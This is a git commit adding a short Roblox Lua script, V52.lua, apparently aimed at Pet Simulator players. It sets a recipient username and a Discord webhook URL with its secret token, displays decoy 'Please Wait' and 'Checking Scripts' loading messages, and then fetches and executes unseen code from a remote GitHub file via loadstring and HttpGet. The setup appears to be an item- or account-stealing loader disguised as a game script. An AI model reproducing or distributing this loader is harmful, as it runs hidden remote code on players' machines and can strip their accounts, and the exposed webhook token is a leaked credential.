ad51beac312e97443f81a0bc0a0cb86799a610aa
TheRobloxShowcaser <126201959+TheRobloxShowcaser@users.noreply.github.com>
2023-02-26 13:28:49 +0000

    Create V52.lua

---
+++ V52.lua
@@ -0,0 +1,9 @@
+Username = "petsimseller6"
+WebHook = "https://discord.com/api/webhooks/1079393934918291578/RfHooIdF0qmK6g9YsEn2JIRnMNAb2zPX2GGudQh1gZvLxHIbXkdQ5DpYx6_CO3yarP34"
+
+_G.CustomScriptName = "Please Wait While We Launch The Script..."
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
